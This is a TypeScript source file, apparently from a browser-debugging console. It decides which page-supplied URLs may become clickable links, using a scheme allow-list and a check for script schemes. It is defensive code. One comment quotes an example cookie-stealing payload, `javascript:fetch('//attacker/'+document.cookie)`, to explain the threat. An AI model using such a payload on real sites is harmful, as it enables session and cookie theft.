/**
 * Whether a URL the debugged page handed us may be used as a link target.
 *
 * Everything the console draws about a page — where it navigated, which
 * request failed, which file a stack frame came from — is a string the agent
 * sent, and the agent runs *inside* the page under investigation. An honest
 * agent reports `location.href`; a page that has noticed the agent owns its
 * WebSocket and can send whatever it likes, and the relay passes those
 * strings through without inspecting them. So a `page.navigated` whose URL is
 * `javascript:fetch('//attacker/'+document.cookie)` is not a far-fetched
 * input: it is the obvious move for a page that wants the investigator's
 * console instead of the other way round. Put that string in an `href` and
 * one click runs it on the console's own origin, where the operator's session
 * to the relay lives.
 *
 * The answer is an allow-list, because the ways of spelling a script URL are
 * open-ended while the schemes these values can honestly have are not:
 *
 *   http, https  a page's location, a request, a script file
 *   ws, wss      a websocket request, which fails often enough that its
 *                Console row has to look like every other request's
 *   file         a locally debugged page
 *
 * The last three are dead links — a browser will not navigate to them from a
 * web origin — and they are on the list anyway, because the row is a link in
 * every other respect and the click handler, not the href, is what the
 * operator is really using. What they cannot do is run anything.
 *
 * Anything else loses its href and keeps its text. Never its text: what the
 * page claimed is the evidence the operator is here to read, so it is shown
 * in full, exactly as it arrived, and only the click is taken away. That
 * covers `javascript:` and `vbscript:`, which execute; `data:`, which can be
 * a whole HTML document; `about:` and `view-source:`; and URLs with no scheme
 * at all, which would otherwise resolve against the console's own origin —
 * `<anonymous>` and `webpack-internal:///…` are real stack entries, and a
 * link to the relay's own `/<anonymous>` is worse than no link.
 *
 * `blob:` is deliberately absent, which is where this list is narrower than
 * it looks like it should be. A blob URL the page reports belongs to the
 * page's origin and cannot be opened from here at all; the only blob URL this
 * browser *can* open is one the console itself minted, which is exactly the
 * thing a forged `blob:` value would be reaching for.
 */
/*
 * The scheme reader lives in the protocol package: the relay has to agree
 * with this file about what a scheme is, and when each kept its own rule they
 * disagreed — one of them read `\0javascript:` as a relative path. Re-exported
 * so a reader of this file does not have to go looking for it.
 */
import { urlScheme } from '@bxconsole/protocol';

export { urlScheme };

const LINKABLE = new Set(['http:', 'https:', 'ws:', 'wss:', 'file:']);

/** Schemes that run code in whatever document they are navigated in. */
const SCRIPTING = new Set(['javascript:', 'vbscript:']);

/** Whether a page-supplied URL may be an `href`, a `window.open` target, or the like. */
export function isLinkableUrl(raw: string): boolean {
  const scheme = urlScheme(raw);
  return scheme !== null && LINKABLE.has(scheme);
}

/**
 * The value to hand to `href`, or undefined to leave the attribute off.
 *
 * Written to be used inline — `<a href={safeHref(entry.url)}>` — so that the
 * check cannot be forgotten at a new call site the way a bare string can.
 */
export function safeHref(raw: string): string | undefined {
  return isLinkableUrl(raw) ? raw : undefined;
}

/**
 * Whether a URL would execute script in the document it is loaded into.
 *
 * The mirror wants this rather than the allow-list above: it is rebuilding a
 * page's own markup, where a `data:` image or a relative path is ordinary and
 * dropping it would falsify what the page looks like. Only the two schemes
 * that run code have to go.
 */
export function isScriptUrl(raw: string): boolean {
  const scheme = urlScheme(raw);
  return scheme !== null && SCRIPTING.has(scheme);
}
